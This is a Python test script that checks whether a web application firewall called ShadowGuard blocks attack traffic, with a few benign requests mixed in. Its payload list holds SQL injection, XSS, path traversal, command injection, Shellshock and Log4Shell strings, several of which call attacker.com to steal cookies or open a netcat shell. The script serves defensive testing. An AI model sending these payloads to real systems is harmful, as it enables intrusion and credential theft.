"""
ShadowGuard — LAN Attack Test Suite
=====================================
Run this from a SEPARATE machine on the LAN to simulate
real attacker traffic.

Usage:
  pip install requests
  python lan_attack_test.py --target 192.168.1.100 --port 80

Replace 192.168.1.100 with the IP of the machine running ShadowGuard.
The WAF machine should be running docker-compose up or app.py.
"""

import argparse
import time
import json
import sys
try:
    import requests
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

ANSI = {
    "red":    "\033[91m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "cyan":   "\033[96m",
    "bold":   "\033[1m",
    "reset":  "\033[0m",
}

def c(color, text): return ANSI.get(color, "") + str(text) + ANSI["reset"]

# ─── Attack Payloads ──────────────────────────────────────────────────────────
ATTACKS = [
    # (name, method, path, params_or_data, expected_result)

    # SQL Injection
    ("SQLi — Union Select",   "GET",  "/search", {"q": "' UNION SELECT username,password,email,role FROM users--"}, "BLOCKED"),
    ("SQLi — Tautology",      "GET",  "/search", {"q": "' OR '1'='1"}, "BLOCKED"),
    ("SQLi — Boolean Blind",  "POST", "/login",  {"username": "admin'--", "password": "x"}, "BLOCKED"),
    ("SQLi — Time-Based",     "GET",  "/search", {"q": "'; SELECT SLEEP(5)--"}, "BLOCKED"),
    ("SQLi — DROP TABLE",     "POST", "/login",  {"username": "'; DROP TABLE users--", "password": "x"}, "BLOCKED"),

    # XSS
    ("XSS — Script Tag",      "GET",  "/search", {"q": "<script>alert('XSS')</script>"}, "BLOCKED"),
    ("XSS — IMG onerror",     "GET",  "/search", {"q": "<img src=x onerror=alert(document.cookie)>"}, "BLOCKED"),
    ("XSS — javascript:",     "GET",  "/search", {"q": "javascript:alert(1)"}, "BLOCKED"),
    ("XSS — SVG onload",      "GET",  "/search", {"q": "<svg/onload=fetch('http://attacker.com?c='+document.cookie)>"}, "BLOCKED"),

    # Path Traversal
    ("Path — /etc/passwd",    "GET",  "/file",   {"path": "../../etc/passwd"}, "BLOCKED"),
    ("Path — URL encoded",    "GET",  "/file",   {"path": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}, "BLOCKED"),
    ("Path — Windows",        "GET",  "/file",   {"path": "..\\..\\windows\\system32\\cmd.exe"}, "BLOCKED"),

    # Command Injection
    ("CMD — Shell pipe",      "GET",  "/ping",   {"host": "8.8.8.8; cat /etc/passwd"}, "BLOCKED"),
    ("CMD — Reverse shell",   "GET",  "/ping",   {"host": "8.8.8.8 | nc attacker.com 4444"}, "BLOCKED"),
    ("CMD — Command sub",     "GET",  "/ping",   {"host": "$(whoami)"}, "BLOCKED"),
    ("CMD — Backtick",        "GET",  "/ping",   {"host": "`id`"}, "BLOCKED"),

    # Shellshock / Log4Shell
    ("Shellshock",            "GET",  "/search", {"q": "() { :; }; echo 'Hacked'"}, "BLOCKED"),
    ("Log4Shell",             "GET",  "/search", {"q": "${jndi:ldap://attacker.com/exploit}"}, "BLOCKED"),

    # Scanner detection
    ("SQLMap UA",             "GET",  "/search", {"q": "test"}, "BLOCKED"),   # with sqlmap UA

    # Safe requests (should be ALLOWED)
    ("Safe — Normal search",  "GET",  "/search", {"q": "laptop"}, "ALLOWED"),
    ("Safe — Product browse",  "GET", "/search", {"q": "phone"}, "ALLOWED"),
    ("Safe — Normal login",   "POST", "/login",  {"username": "alice", "password": "password1"}, "ALLOWED"),
    ("Safe — File readme",    "GET",  "/file",   {"path": "/etc/hostname"}, "ALLOWED"),
]


def run_test(base_url: str, name: str, method: str, path: str,
             params: dict, expected: str, delay: float = 0.3) -> dict:
    """Send a single test request and report result."""
    url = base_url + path
    try:
        if method == "GET":
            r = requests.get(url, params=params, timeout=5,
                             headers={"User-Agent": "sqlmap/1.7" if "SQLMap" in name else "TestClient/1.0"})
        else:
            r = requests.post(url, data=params, timeout=5)

        status = r.status_code
        blocked = status == 403
        actual = "BLOCKED" if blocked else "ALLOWED"
        passed = actual == expected

        symbol = "✓" if passed else "✗"
        color = "green" if passed else "red"
        print(f"  {c(color, symbol)} {name:<35} → {c(color, actual)} (HTTP {status}) {'✓ PASS' if passed else '✗ FAIL'}")

        time.sleep(delay)
        return {"name": name, "expected": expected, "actual": actual, "passed": passed, "status": status}

    except requests.exceptions.ConnectionError:
        print(f"  {c('red', '✗')} {name:<35} → CONNECTION REFUSED")
        return {"name": name, "expected": expected, "actual": "ERROR", "passed": False, "status": 0}
    except Exception as e:
        print(f"  {c('red', '✗')} {name:<35} → ERROR: {e}")
        return {"name": name, "expected": expected, "actual": "ERROR", "passed": False, "status": 0}


def main():
    parser = argparse.ArgumentParser(description="ShadowGuard LAN Attack Test Suite")
    parser.add_argument("--target", default="localhost", help="WAF IP or hostname")
    parser.add_argument("--port",   type=int, default=80, help="WAF port (default: 80)")
    parser.add_argument("--delay",  type=float, default=0.3, help="Delay between requests (s)")
    parser.add_argument("--category", default="all", choices=["all","sqli","xss","path","cmd","safe"])
    args = parser.parse_args()

    base_url = f"http://{args.target}:{args.port}"

    print(c("bold", "\n" + "═"*60))
    print(c("bold", c("cyan", "  ShadowGuard — LAN Attack Test Suite")))
    print(c("bold", "═"*60))
    print(f"  Target : {c('cyan', base_url)}")
    print(f"  Mode   : {args.category}")
    print(c("bold", "═"*60) + "\n")

    # Filter by category
    attacks = ATTACKS
    if args.category != "all":
        cat_map = {"sqli": "SQLi", "xss": "XSS", "path": "Path", "cmd": "CMD", "safe": "Safe"}
        prefix = cat_map[args.category]
        attacks = [(n, m, p, d, e) for n, m, p, d, e in ATTACKS if n.startswith(prefix)]

    results = []
    categories = {}

    current_cat = None
    for name, method, path, params, expected in attacks:
        cat = name.split(" — ")[0]
        if cat != current_cat:
            print(c("yellow", f"\n  [ {cat} ]"))
            current_cat = cat
        r = run_test(base_url, name, method, path, params, expected, args.delay)
        results.append(r)
        categories.setdefault(cat, []).append(r)

    # Summary
    passed = sum(1 for r in results if r["passed"])
    total = len(results)
    blocked_correctly = sum(1 for r in results if r["expected"] == "BLOCKED" and r["passed"])
    allowed_correctly = sum(1 for r in results if r["expected"] == "ALLOWED" and r["passed"])

    print(c("bold", "\n" + "═"*60))
    print(c("bold", "  RESULTS SUMMARY"))
    print("─"*60)
    print(f"  Total Tests   : {total}")
    print(f"  Passed        : {c('green', passed)} / {total}")
    print(f"  Failed        : {c('red', total-passed)}")
    print(f"  Detection Rate: {c('cyan', f'{passed/total*100:.1f}%')}")
    print(f"  Attacks Blocked Correctly : {c('green', blocked_correctly)}")
    print(f"  Safe Requests Passed      : {c('green', allowed_correctly)}")
    print()

    for cat, cat_results in categories.items():
        p = sum(1 for r in cat_results if r["passed"])
        t = len(cat_results)
        bar = "█" * p + "░" * (t-p)
        color = "green" if p == t else "yellow" if p > t//2 else "red"
        print(f"  {cat:<20} {c(color, bar)} {p}/{t}")

    print(c("bold", "═"*60))
    if passed == total:
        print(c("green", c("bold", "  PERFECT SCORE — ShadowGuard blocked all attacks! 🛡️")))
    elif passed >= total * 0.8:
        print(c("yellow", c("bold", "  GOOD — Most attacks blocked. Check failed cases.")))
    else:
        print(c("red", c("bold", "  NEEDS IMPROVEMENT — Check model threshold and rules.")))
    print(c("bold", "═"*60) + "\n")


if __name__ == "__main__":
    main()